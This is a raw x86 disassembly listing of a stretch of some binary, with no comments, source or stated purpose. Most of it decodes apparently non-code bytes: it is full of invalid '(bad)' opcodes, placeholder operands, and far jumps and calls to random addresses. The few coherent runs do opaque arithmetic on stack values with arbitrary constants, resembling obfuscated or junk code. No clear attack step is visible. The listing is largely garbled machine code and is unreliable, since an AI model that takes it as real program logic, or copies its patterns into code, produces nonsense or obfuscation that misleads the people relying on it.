  414885:	call   0xed5b:0x996d9973
  41488c:	jno    0x4148b6
  41488e:	jmp    0xdbb1:0x3c7216d1
  414895:	xor    al,0xa0
  414897:	dec    ebp
  414898:	fnstcw WORD PTR [edx]
  41489a:	lahf   
  41489b:	jo     0x4148a0
  41489d:	daa    
  41489e:	das    
  41489f:	mov    cl,0x6c
  4148a1:	adc    eax,0xe51078e6
  4148a6:	jecxz  0x41485a
  4148a8:	jbe    0x4148aa
  4148aa:	dec    esi
  4148ab:	sbb    dh,cl
  4148ad:	gs mov ebp,0x52a283a9
  4148b3:	xchg   esp,eax
  4148b4:	mov    al,ds:0x994d5898
  4148b9:	jns    0x414855
  4148bb:	sub    eax,0x5330a29f
  4148c0:	jmp    0xfde17431
  4148c5:	jmp    0x49:0x805104f9
  4148cc:	addr16 jae 0x414923
  4148cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148d0:	retf   0xeb29
  4148d3:	jl     0x414880
  4148d5:	pop    esi
  4148d6:	int    0x73
  4148d8:	fstp   DWORD PTR [edx]
  4148da:	je     0x414872
  4148dc:	call   0x32a39d1
  4148e1:	shr    BYTE PTR [eax],1
  4148e3:	(bad)  
  4148e4:	test   DWORD PTR [edx],0xad7e4ddf
  4148ea:	jmp    0x2d5a:0x37176d6
  4148f1:	cmp    al,0x46
  4148f3:	jg     0x4148a4
  4148f5:	mov    eax,ds:0xa275c0e7
  4148fa:	(bad)  
  4148fb:	xor    dh,0x5f
  4148fe:	rcr    DWORD PTR [eax-0x53fef37c],0x2
  414905:	mov    gs,WORD PTR [ecx+0x665f6f29]
  41490b:	imul   ecx,DWORD PTR [eax+0x61],0x26
  41490f:	stos   DWORD PTR es:[edi],eax
  414910:	(bad)  [eax+0x45]
  414913:	(bad)  
  414914:	pop    esi
  414915:	pop    esi
  414916:	retf   0xef0d
  414919:	jne    0x41490e
  41491b:	cmp    edx,ebx
  41491d:	and    al,0xf5
  41491f:	cwde   
  414920:	push   edx
  414921:	iret   
  414922:	imul   esp,esi,0x11
  414925:	jbe    0x41495b
  414927:	cmp    DWORD PTR [edi],ebx
  414929:	sbb    DWORD PTR [eax-0x5d],esi
  41492c:	call   FWORD PTR [eax-0x32988147]
  414932:	mov    bh,0x82
  414934:	jmp    FWORD PTR [edi+0x26e5ad15]
  41493a:	out    dx,al
  41493b:	sub    BYTE PTR [esp+ecx*2+0x18],ah
  41493f:	ret    
  414940:	jmp    0x4149b1
  414942:	sbb    DWORD PTR [edi+eiz*2-0x74cd6efa],0xf8b8fc4d
  41494d:	out    dx,eax
  41494e:	(bad)  
  41494f:	dec    DWORD PTR [ebx+0x3d12bd0]
  414955:	push   ebp
  414956:	clc    
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0x17
  414996:	lods   al,BYTE PTR ds:[esi]
  414997:	mov    ecx,0x181c8b7c
  41499c:	sbb    al,dl
  41499e:	adc    bl,BYTE PTR [eax]
  4149a0:	sbb    dh,al
  4149a2:	xchg   ecx,eax
  4149a3:	nop
  4149a4:	loopne 0x414978
  4149a6:	sar    DWORD PTR [edx+ebp*2-0x6c],0x49
  4149ab:	lods   al,BYTE PTR ds:[esi]
  4149ac:	das    
  4149ad:	sub    eax,0x27175971
  4149b2:	inc    ebp
  4149b3:	mov    ds:0xbe6022db,al
  4149b8:	lahf   
  4149b9:	mov    ?,WORD PTR [ecx-0x53f1c825]
  4149bf:	repnz mov edi,0xfbe80a08
  4149c5:	mov    BYTE PTR [ebx+0x2c49d12c],ch
  4149cb:	in     al,0x3e
  4149cd:	sub    DWORD PTR [eax-0x77],edx
  4149d0:	adc    al,0xa9
  4149d2:	fbld   TBYTE PTR [edx-0x6c]
  4149d5:	push   edx
  4149d6:	jns    0x4149d5
  4149d8:	lock int3 
  4149da:	push   ecx
  4149db:	xor    esi,edi
  4149dd:	js     0x4149d5
  4149df:	aad    0xdf
  4149e1:	out    dx,eax
  4149e2:	fmul   st,st(6)
  4149e4:	fisubr DWORD PTR [ecx+0x25]
  4149e7:	scas   al,BYTE PTR es:[edi]
  4149e8:	hlt    
  4149e9:	mov    al,0x6f
  4149eb:	or     eax,0xee5a9f0
  4149f0:	scas   eax,DWORD PTR es:[edi]
  4149f1:	shl    ebx,cl
  4149f3:	inc    esp
  4149f4:	ins    DWORD PTR es:[edi],dx
  4149f5:	retf   
  4149f6:	cwde   
  4149f7:	xchg   dl,ch
  4149f9:	or     eax,0x34d40d17
  4149fe:	jne    0x414a3c
  414a00:	ja     0x4149aa
  414a02:	das    
  414a03:	call   0x6d1793ed
  414a08:	or     al,bl
  414a0a:	cmc    
  414a0b:	loopne 0x4149ee
  414a0d:	mov    bh,0x41
  414a0f:	jmp    0x414a16
  414a11:	pop    ebx
  414a12:	aam    0x4b
  414a14:	(bad)  
  414a15:	xor    dl,cl
  414a17:	in     al,dx
  414a18:	dec    eax
  414a19:	gs dec edi
  414a1b:	mov    ebp,0x4a0f3af2
  414a20:	cmp    eax,0x40003b89
  414a25:	xchg   edi,eax
  414a26:	retf   0x293
  414a29:	loopne 0x414a59
  414a2b:	bound  ecx,QWORD PTR [esi+0x1e]
  414a2e:	sub    BYTE PTR [ebp+0x65],cl
  414a31:	daa    
  414a32:	iret   
  414a33:	out    dx,eax
  414a34:	das    
  414a35:	(bad)  
  414a36:	sub    eax,0x166d81c2
  414a3b:	aad    0xea
  414a3d:	(bad)  
  414a3e:	pop    ebp
  414a3f:	pop    ebx
  414a40:	push   ss
  414a41:	fcmovne st,st(4)
  414a43:	add    al,BYTE PTR [esi-0x1599840d]
  414a49:	or     BYTE PTR [esi],bl
  414a4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a4c:	(bad)  
  414a4d:	es in  eax,0xd0
  414a50:	ficomp WORD PTR [edx-0x227127f4]
  414a56:	xchg   edx,eax
  414a57:	outs   dx,BYTE PTR ds:[esi]
  414a58:	fld    TBYTE PTR [ecx]
  414a5a:	loope  0x414a1d
  414a5c:	loopne 0x414aaf
  414a5e:	pop    ds
  414a5f:	stc    
  414a60:	scas   eax,DWORD PTR es:[edi]
  414a61:	mov    dl,0x97
  414a63:	int3   
  414a64:	mov    al,ds:0x4c746ee6
  414a69:	rcr    esp,0x28
  414a6c:	ins    BYTE PTR es:[edi],dx
  414a6d:	push   ds
  414a6e:	int3   
  414a6f:	in     eax,0x9d
  414a71:	adc    al,0xd9
  414a73:	ins    DWORD PTR es:[edi],dx
  414a74:	ins    BYTE PTR es:[edi],dx
  414a75:	sbb    eax,0xdef1ad42
  414a7a:	push   ds
  414a7b:	mov    esi,0x717b8a30
  414a80:	cmp    BYTE PTR [ecx],al
  414a82:	mov    ds:0x415c832,eax
  414a87:	gs shl esp,0x11
  414a8b:	pop    edx
  414a8c:	cld    
  414a8d:	mov    al,ds:0x9f4b3bc5
  414a92:	int3   
  414a93:	mov    ecx,0xe01ad0a8
  414a98:	and    DWORD PTR [esi],ebx
  414a9a:	xchg   ebx,eax
  414a9b:	push   edx
  414a9c:	pop    ebp
  414a9d:	je     0x414abc
  414a9f:	push   0xffffff94
  414aa1:	sahf   
  414aa2:	xor    DWORD PTR [ebx],ebx
  414aa4:	or     bl,ah
  414aa6:	outs   dx,BYTE PTR ds:[esi]
  414aa7:	mov    ds:0xc8114c05,eax
  414aac:	stc    
  414aad:	add    ebp,DWORD PTR [eax-0x1c]
  414ab0:	add    al,0x71
  414ab2:	pop    eax
  414ab3:	outs   dx,DWORD PTR ds:[esi]
  414ab4:	ret    
  414ab5:	out    dx,eax
  414ab6:	lods   eax,DWORD PTR gs:[esi]
  414ab8:	jle    0x414ac7
  414aba:	xor    ecx,DWORD PTR [esi-0x2befd198]
  414ac0:	mov    ch,0x97
  414ac2:	dec    esi
  414ac3:	je     0x414b2f
  414ac5:	in     eax,dx
  414ac6:	(bad)  
  414ac7:	and    eax,0x6fa12c0e
  414acc:	push   esi
  414acd:	aam    0xf2
  414acf:	es jp  0x414af6
  414ad2:	popa   
  414ad3:	shl    BYTE PTR ds:0x6bb8f6e2,1
  414ad9:	sar    al,1
  414adb:	retf   0x28b0
  414ade:	dec    esi
  414adf:	cmp    BYTE PTR [edx],bh
  414ae1:	jbe    0x414b12
  414ae3:	ficom  WORD PTR [ebp+0x7cd71d70]
  414ae9:	scas   eax,DWORD PTR es:[edi]
  414aea:	xlat   BYTE PTR ds:[ebx]
  414aeb:	sahf   
  414aec:	fwait
  414aed:	pop    edi
  414aee:	mov    ecx,0x76de25e1
  414af3:	icebp  
  414af4:	mov    al,0xb5
  414af6:	stos   DWORD PTR es:[edi],eax
  414af7:	mov    ?,WORD PTR [esi-0x6]
  414afa:	(bad)  
  414afb:	cmp    al,0x9e
  414afd:	out    0x8a,eax
  414aff:	ins    DWORD PTR es:[edi],dx
  414b00:	mov    DWORD PTR [ebx-0x72],eax
  414b03:	aaa    
  414b04:	push   0x9d96531f
  414b09:	adc    DWORD PTR [ebp+0x1bcac365],0xd12ef5f5
  414b13:	sub    DWORD PTR [edx-0x3f2a3765],0x32bbd8eb
  414b1d:	mov    eax,ds:0x56981010
  414b22:	hlt    
  414b23:	or     BYTE PTR [bx+si-0x24],ah
  414b27:	jne    0x414b2a
  414b29:	aad    0xe
  414b2b:	cs jmp 0xe361:0x138c3ac9
  414b33:	jae    0x414aec
  414b35:	(bad)  [ecx-0x315cc75c]
  414b3b:	cmp    eax,0xa179a0a0
  414b40:	adc    al,0xd5
  414b42:	mov    cl,0x8b
  414b44:	dec    ecx
  414b45:	and    esi,edx
  414b47:	ret    0x3e87
  414b4a:	inc    edi
  414b4b:	rcr    dl,1
  414b4d:	xor    DWORD PTR [esi+edi*2+0x1f516521],edx
  414b54:	push   cs
  414b55:	retf   0x586d
  414b58:	(bad)  
  414b59:	mov    eax,ds:0xba6387df
  414b5e:	retf   
  414b5f:	sbb    DWORD PTR [ebx],edx
  414b61:	mov    al,ds:0x558c181b
  414b66:	fistp  DWORD PTR [edi]
  414b68:	popa   
  414b69:	pop    ds
  414b6a:	leave  
  414b6b:	fwait
  414b6c:	or     eax,0x39d7ad74
  414b71:	xchg   esi,eax
  414b72:	daa    
  414b73:	stos   DWORD PTR es:[edi],eax
  414b74:	test   eax,0xd7551709
  414b79:	rcr    DWORD PTR [ecx-0x44d74516],cl
  414b7f:	xchg   edi,eax
  414b80:	retf   0xa9aa
  414b83:	(bad)  
  414b85:	xor    DWORD PTR [eax],ebp
  414b87:	sub    DWORD PTR [bx+si-0x7d9b],0x22
  414b8d:	pop    ebp
  414b8e:	mov    edi,0xc6d1e03e
  414b93:	jbe    0x414b71
  414b95:	mov    dl,0xdf
  414b97:	cmc    
  414b98:	push   eax
  414b99:	xor    eax,0xca854e2b
  414b9e:	fwait
  414b9f:	mov    eax,0x5022ec08
  414ba4:	bound  edi,QWORD PTR [ebp+0x288b12af]
  414baa:	(bad)  
  414bab:	cmc    
  414bac:	ins    DWORD PTR es:[edi],dx
  414bad:	mov    eax,0x2fe4ad66
  414bb2:	outs   dx,BYTE PTR ds:[esi]
  414bb3:	xor    DWORD PTR ds:0xf79996ee,edx
  414bb9:	push   es
  414bba:	rcl    ch,0x46
  414bbd:	pop    ecx
  414bbe:	cmp    ebx,DWORD PTR [edi+0x36]
  414bc1:	push   0x89dfd32c
  414bc6:	ret    0x2cfb
  414bc9:	cmp    esi,DWORD PTR [ebx+ebp*4-0x1b]
  414bcd:	arpl   bp,sp
  414bcf:	cs sti 
  414bd1:	pop    ebx
  414bd2:	mov    bl,0xf
  414bd4:	sar    cl,cl
  414bd6:	popa   
  414bd7:	(bad)  
  414bd8:	xchg   esp,eax
  414bd9:	mov    eax,ds:0xbec6889e
  414bde:	and    edx,DWORD PTR [edx-0x1a]
  414be1:	scas   al,BYTE PTR es:[edi]
  414be2:	out    0x17,eax
  414be4:	push   ebp
  414be5:	aam    0x41
  414be7:	mov    esi,0xe65a871e
  414bec:	jae    0x414bea
  414bee:	pop    ss
  414bef:	and    al,0x7f
  414bf1:	sub    DWORD PTR [esi],ebx
  414bf3:	fstp   QWORD PTR [ebp+0x7f]
  414bf6:	or     al,0xba
  414bf8:	pop    edx
  414bf9:	xchg   ebx,eax
  414bfa:	gs pop esi
  414bfc:	pop    ecx
  414bfd:	xor    eax,0x9e515d15
  414c02:	jp     0x414bf4
  414c04:	lahf   
  414c05:	and    eax,ecx
  414c07:	imul   ebp,esp,0x57806608
  414c0d:	and    eax,0xcd098393
  414c12:	mov    eax,DWORD PTR [ecx+0x56]
  414c15:	cwde   
  414c16:	xor    bl,cl
  414c18:	or     al,dl
  414c1a:	and    BYTE PTR [eax],dl
  414c1c:	(bad)  [ebx-0x3]
  414c1f:	int3   
  414c20:	push   0xffffff9c
  414c22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c23:	cdq    
  414c24:	mov    ds:0x8d742981,al
  414c29:	cmp    eax,0x4bb9158e
  414c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c2f:	mov    ebp,0x7d0ef18c
  414c34:	xchg   edi,eax
  414c35:	xchg   DWORD PTR [esi+0x69],esp
  414c38:	or     edi,DWORD PTR [edx]
  414c3a:	dec    edi
  414c3b:	mov    BYTE PTR [ecx+0x5e7dcbf8],ah
  414c41:	in     eax,0xfb
  414c43:	inc    esp
  414c44:	jg     0x414be8
  414c46:	dec    ebp
  414c47:	mov    edx,DWORD PTR [ecx]
  414c49:	inc    ecx
  414c4a:	aad    0x67
  414c4c:	aam    0x46
  414c4e:	sbb    ebx,eax
  414c50:	pop    eax
  414c51:	mov    esp,0x5a2658c1
  414c56:	ret    
  414c57:	nop
  414c58:	icebp  
  414c59:	jbe    0x414ca0
  414c5b:	mov    ebx,DWORD PTR [ecx-0x1a]
  414c5e:	in     eax,dx
  414c5f:	xchg   ebp,eax
  414c60:	mov    dh,BYTE PTR [ebx-0x3938ea61]
  414c66:	inc    ecx
  414c67:	pushf  
  414c68:	das    
  414c69:	cdq    
  414c6a:	ret    
  414c6b:	enter  0xb09b,0x26
  414c6f:	jecxz  0x414cae
  414c71:	push   es
  414c72:	data16 imul BYTE PTR [eax-0x3a9be720]
  414c79:	xor    esp,DWORD PTR [edi+0x18]
  414c7c:	or     eax,0x23db47c8
  414c81:	mov    ebx,0xe49a6276
  414c86:	icebp  
  414c87:	and    al,bl
  414c89:	xor    eax,0xc139c246
  414c8e:	into   
  414c8f:	add    dh,dl
  414c91:	jne    0x414ccb
  414c93:	out    0xcd,al
  414c95:	xchg   ecx,eax
  414c96:	lds    esi,FWORD PTR [eax+0x10]
  414c99:	sbb    al,0xab
  414c9b:	hlt    
  414c9c:	sub    ecx,DWORD PTR [ebx]
  414c9e:	jg     0x414c4b
  414ca0:	xchg   edi,eax
  414ca1:	adc    dl,BYTE PTR [ecx+0x73]
  414ca4:	adc    eax,0x93e77d8
  414ca9:	or     DWORD PTR ds:[edx-0x69],eax
  414cad:	jl     0x414c9f
  414caf:	sbb    eax,0x1d39a378
  414cb4:	out    0xdb,eax
  414cb6:	test   eax,0xc3de981a
  414cbb:	push   esi
  414cbc:	push   ebx
  414cbd:	enter  0x2018,0x9d
  414cc1:	arpl   WORD PTR [esi+0x60680b0],di
  414cc7:	out    0x7b,eax
  414cc9:	and    dh,BYTE PTR [edx+0x42]
  414ccc:	mov    al,ds:0x60eb9f92
  414cd1:	xchg   BYTE PTR [ebx+0x19],cl
  414cd4:	sbb    DWORD PTR [edx+0x60],ecx
  414cd7:	clc    
  414cd8:	jl     0x414c6d
  414cda:	mov    ds:0x88d124c3,al
  414cdf:	add    al,0x6d
  414ce1:	bound  eax,QWORD PTR [ebx]
  414ce3:	sbb    al,0xcc
  414ce5:	jge    0x414d19
  414ce7:	adc    al,0x3c
  414ce9:	push   edx
  414cea:	pop    edi
  414ceb:	ret    
  414cec:	in     al,dx
  414ced:	add    DWORD PTR [esi+0x11],ecx
  414cf0:	je     0x414ca3
  414cf2:	inc    BYTE PTR [ebx]
  414cf4:	cdq    
  414cf5:	fdiv   QWORD PTR [ebp-0x36]
  414cf8:	aad    0x64
  414cfa:	push   es
  414cfb:	pusha  
  414cfc:	rol    BYTE PTR [eax],0x8d
  414cff:	xor    ah,BYTE PTR [esi]
  414d01:	jle    0x414d82
  414d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d04:	rol    DWORD PTR [ebp+0x5950350b],0xf4
  414d0b:	mov    eax,ds:0xaf2b6d17
  414d10:	mov    edx,esp
  414d12:	imul   eax,esi,0x48
  414d15:	pop    ebp
  414d16:	mov    ah,0xc7
  414d18:	shl    DWORD PTR [ebx-0x58],0xda
  414d1c:	push   cs
  414d1d:	shr    BYTE PTR [edx],cl
  414d1f:	and    al,0x2b
  414d21:	(bad)  
  414d22:	jb     0x414d46
  414d24:	mov    al,0xd4
  414d26:	repz and bh,BYTE PTR [ebx]
  414d29:	fcmovnu st,st(5)
  414d2b:	ins    BYTE PTR es:[edi],dx
  414d2c:	cwde   
  414d2d:	dec    esi
  414d2e:	jnp    0x414d8c
  414d30:	cmp    bh,BYTE PTR [edi+0x6f06aafe]
  414d36:	cmc    
  414d37:	loopne 0x414d18
  414d39:	test   eax,0x10fac984
  414d3e:	mov    edi,cs
  414d40:	loopne 0x414dbc
  414d42:	and    al,0x3b
  414d44:	add    eax,0xd159b92
  414d49:	add    eax,ecx
  414d4b:	mov    ecx,DWORD PTR [ebp+0x8]
  414d4e:	add    ecx,eax
  414d50:	mov    DWORD PTR [ebp+0x8],ecx
  414d53:	mov    eax,DWORD PTR [ebp-0x24]
  414d56:	mov    ecx,DWORD PTR [ebp-0x28]
  414d59:	and    eax,ecx
  414d5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  414d5e:	and    eax,ecx
  414d60:	mov    ecx,DWORD PTR [ebp-0x30]
  414d63:	imul   eax,ecx
  414d66:	mov    ecx,DWORD PTR [ebp-0x34]
  414d69:	or     eax,ecx
  414d6b:	mov    ecx,DWORD PTR [ebp-0x38]
  414d6e:	imul   eax,ecx
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0xb2
  414e02:	pop    esp
  414e03:	inc    ebp
  414e04:	push   0x42
  414e06:	push   ss
  414e07:	push   ss
  414e08:	sbb    BYTE PTR [edx+0x57181812],dl
  414e0e:	push   eax
  414e0f:	mov    esi,0x58facc26
  414e14:	and    esi,DWORD PTR [esi-0x6e]
  414e17:	push   esp
  414e18:	sub    BYTE PTR ds:0x63ab83d5,cl
  414e1e:	loop   0x414dc4
  414e20:	cmp    DWORD PTR [eax],ebx
  414e22:	popf   
  414e23:	mov    WORD PTR ds:0xc0e4c702,es
  414e29:	je     0x414e1e
  414e2b:	std    
  414e2c:	push   esi
  414e2d:	jl     0x414df1
  414e2f:	jae    0x414e17
  414e31:	push   ebp
  414e32:	cmp    esi,DWORD PTR [esi]
  414e34:	call   0x14aa482c
  414e39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e3a:	adc    DWORD PTR [eax+0x4b],ebx
  414e3d:	lahf   
  414e3e:	imul   ebp,DWORD PTR [ebx-0x12],0x1c
  414e42:	mov    esp,0xe15453fd
  414e47:	xchg   esi,eax
  414e48:	mov    ecx,0x9c3b305
  414e4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e4e:	out    0xfc,eax
  414e50:	cwde   
  414e51:	inc    esi
  414e52:	test   eax,0xd0d18668
  414e57:	mov    al,0xbe
  414e59:	test   DWORD PTR [ecx-0x5016203a],esi
  414e5f:	rol    ecx,1
  414e61:	and    BYTE PTR [ebp+0x177f7f6],cl
  414e67:	mov    BYTE PTR [esi+0x1ae29e0f],bl
  414e6d:	shr    BYTE PTR [edi+0x16],cl
  414e70:	arpl   di,ax
  414e72:	rcr    BYTE PTR ds:0xa37213e8,0xc6
  414e79:	inc    eax
  414e7a:	sahf   
  414e7b:	cli    
  414e7c:	(bad)  
  414e7d:	mov    ds:0x46bc267d,eax
  414e82:	pop    ecx
  414e83:	rcl    DWORD PTR [ecx+edi*8+0x6e],1
  414e87:	cmp    ch,ch
  414e89:	mov    cl,0xa9
  414e8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e8c:	sub    BYTE PTR [ebx+0xbdf14e8],ch
  414e92:	lods   al,BYTE PTR ds:[esi]
  414e93:	je     0x414ead
  414e95:	xchg   esi,eax
  414e96:	hlt    
  414e97:	imul   eax,DWORD PTR [ecx+0x4a0dcd2d],0x22a87f43
  414ea1:	mov    eax,0x9ddcf9f2
  414ea6:	imul   esi,DWORD PTR [ecx-0x59b94216],0x6e
  414ead:	sub    cl,bl
  414eaf:	jb     0x414e43
  414eb1:	and    eax,0xe8c43b35
  414eb6:	pusha  
  414eb7:	fsubr  QWORD PTR [ebp+0x696f8daa]
  414ebd:	aaa    
  414ebe:	in     al,0xad
  414ec0:	cmc    
  414ec1:	scas   eax,DWORD PTR es:[edi]
  414ec2:	std    
  414ec3:	jmp    0xbc0dee7a
  414ec8:	jcxz   0x414f1e
  414ecb:	in     al,0x92
  414ecd:	sub    al,0x55
  414ecf:	sub    al,0x50
  414ed1:	cmp    DWORD PTR [eax+0x4496ed1a],ebx
  414ed7:	inc    eax
  414ed8:	ins    DWORD PTR es:[edi],dx
  414ed9:	mov    eax,ds:0x61c3a3a8
  414ede:	sub    eax,0x5382af60
  414ee3:	dec    edx
  414ee4:	xchg   esi,eax
  414ee5:	test   DWORD PTR [edx-0x2d],edi
  414ee8:	les    ebp,FWORD PTR [eiz*8-0x21091c2f]
  414eef:	sahf   
  414ef0:	lods   al,BYTE PTR ds:[esi]
  414ef1:	pop    edx
  414ef2:	sub    al,0xcc
  414ef4:	test   DWORD PTR [eax],edi
  414ef6:	std    
  414ef7:	loop   0x414f5f
  414ef9:	icebp  
  414efa:	inc    ebx
  414efb:	std    
  414efc:	cmp    dh,BYTE PTR [edi+0x1f]
  414eff:	xchg   esi,eax
  414f00:	idiv   eax
  414f02:	inc    esp
  414f03:	push   ss
  414f04:	mov    ch,0x97
  414f06:	sti    
  414f07:	fstp   TBYTE PTR [ebp-0x554303d]
  414f0d:	call   FWORD PTR [esi+0x7c]
  414f10:	shr    dh,cl
  414f12:	mov    eax,edx
  414f14:	lea    ebp,[esi+0x5b]
  414f17:	push   ecx
  414f18:	rol    DWORD PTR ds:0xb63a02d5,1
  414f1e:	mov    cl,BYTE PTR [edx+0x46040741]
  414f24:	jb     0x414f22
  414f26:	iret   
  414f27:	scas   eax,DWORD PTR es:[edi]
  414f28:	dec    ebx
  414f29:	les    edi,FWORD PTR [ecx+0x4f]
  414f2c:	xchg   ebx,eax
  414f2d:	and    al,0x78
  414f2f:	test   eax,0xd1861a4a
  414f34:	les    edx,FWORD PTR [ecx-0x12e60eff]
  414f3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f3b:	call   0xd0c82e81
  414f40:	sti    
  414f41:	(bad)  
  414f42:	pop    esp
  414f43:	pop    edi
  414f44:	pop    ebx
  414f45:	xor    dh,dh
  414f47:	test   al,0x2b
  414f49:	pop    ss
  414f4a:	push   es
  414f4b:	paddsb mm0,QWORD PTR [edi]
  414f4e:	cmc    
  414f4f:	arpl   WORD PTR [ebp-0x4c],si
  414f52:	xor    DWORD PTR [edx],0xe5edcc51
  414f58:	mov    edx,0x8767aba8
  414f5d:	cwde   
  414f5e:	sbb    edi,esp
  414f60:	pop    edx
  414f61:	sbb    DWORD PTR [ebx-0xdbcab02],esi
  414f67:	daa    
  414f68:	arpl   WORD PTR [esi-0x7f],cx
  414f6b:	pop    ss
  414f6c:	inc    ecx
  414f6d:	jnp    0x414f3d
  414f6f:	mov    edi,0xb6c41dde
  414f74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f75:	inc    edi
  414f76:	sbb    al,0x5b
  414f78:	stos   DWORD PTR es:[edi],eax
  414f79:	fdivr  QWORD PTR [esi+ecx*2+0x25]
  414f7d:	push   ecx
  414f7e:	mov    gs,esi
  414f80:	pop    edi
  414f81:	jle    0x414fc3
  414f83:	inc    esi
  414f84:	ror    dl,cl
  414f86:	icebp  
  414f87:	xchg   ch,cl
  414f89:	sub    ebx,DWORD PTR [ebx+0x7869b07b]
  414f8f:	out    0x32,eax
  414f91:	add    edx,ebp
  414f93:	(bad)  
  414f94:	cmp    BYTE PTR [edx+edi*1],bh
  414f97:	cli    
  414f98:	mov    ah,0xad
  414f9a:	cdq    
  414f9b:	test   eax,0xc50e0c8e
  414fa0:	dec    eax
  414fa1:	push   ds
  414fa2:	fnsave [eax-0x7dbb9be9]
  414fa8:	push   0xbf3c3274
  414fad:	aam    0x25
  414faf:	sbb    al,BYTE PTR [edx]
  414fb1:	das    
  414fb2:	call   0x5928d024
  414fb7:	sar    eax,0xb3
  414fba:	in     al,dx
  414fbb:	call   0x4899:0x122cd1e1
  414fc2:	add    BYTE PTR [edi+0x2c],dh
  414fc5:	sub    DWORD PTR [ebp+ebp*1-0x4b8107fa],0x10575d8c
  414fd0:	lock arpl WORD PTR [ebp+0x1c],cx
  414fd4:	mov    ecx,0xc07bfbd1
  414fd9:	cmp    cl,BYTE PTR [esi]
  414fdb:	repnz adc BYTE PTR [esi],dh
  414fde:	dec    ebp
  414fdf:	es push ebp
  414fe1:	clc    
  414fe2:	jmp    0x130e1c55
  414fe7:	es in  al,0xf
  414fea:	(bad)  
  414feb:	mov    ah,0x67
  414fed:	dec    ebx
  414fee:	in     al,dx
  414fef:	fadd   QWORD PTR ds:[edi+0x64]
  414ff3:	push   ss
  414ff4:	push   ebp
  414ff5:	retf   0x4937
  414ff8:	push   ebx
  414ff9:	mov    ch,0x24
  414ffb:	jecxz  0x415019
  414ffd:	pusha  
  414ffe:	mov    esi,0x8b42068f
  415003:	std    
  415004:	mov    al,BYTE PTR [edx+0x72]
  415007:	pusha  
  415008:	aas    
  415009:	or     eax,0x6308fc68
  41500e:	push   edi
  41500f:	sub    BYTE PTR [ebp+0x6626b6c3],bl
  415015:	add    al,0x6c
  415017:	mov    ds:0x96b3a56d,al
  41501c:	(bad)  
  41501d:	xchg   ebp,eax
  41501e:	push   ecx
  41501f:	stos   DWORD PTR es:[edi],eax
  415020:	mov    BYTE PTR [edi-0x5d],al
  415023:	(bad)  
  415024:	pusha  
  415025:	inc    BYTE PTR [edx+0x1e5379fb]
  41502b:	popa   
  41502c:	pop    ds
  41502d:	aas    
  41502e:	data16 ja 0x41507c
  415031:	das    
  415032:	daa    
  415033:	sahf   
  415034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415035:	pop    es
  415036:	sahf   
  415037:	(bad)  
  415038:	(bad)  
  415039:	adc    BYTE PTR [eax+0x74ca5965],ah
  41503f:	add    al,BYTE PTR [edi]
  415041:	daa    
  415042:	mov    edi,0xdb65fa4a
  415047:	xchg   ebx,eax
  415048:	sahf   
  415049:	xchg   ebx,eax
  41504a:	jp     0x415030
  41504c:	es push ecx
  41504e:	in     eax,dx
  41504f:	outs   dx,DWORD PTR ds:[esi]
  415050:	cmp    BYTE PTR [eax-0x3a26df1b],dh
  415056:	inc    ecx
  415057:	cmp    al,bh
  415059:	and    eax,0x60f75b74
  41505e:	sub    eax,0x82767e4b
  415063:	jg     0x415016
  415065:	repz pusha 
  415067:	xor    DWORD PTR [ebx-0x67],esi
  41506a:	fs je  0x415073
  41506d:	(bad)
  415070:	(bad)
  415073:	and    ebx,DWORD PTR [esi-0x4a]
  415076:	push   es
  415077:	lods   eax,DWORD PTR ds:[esi]
  415078:	loopne 0x415045
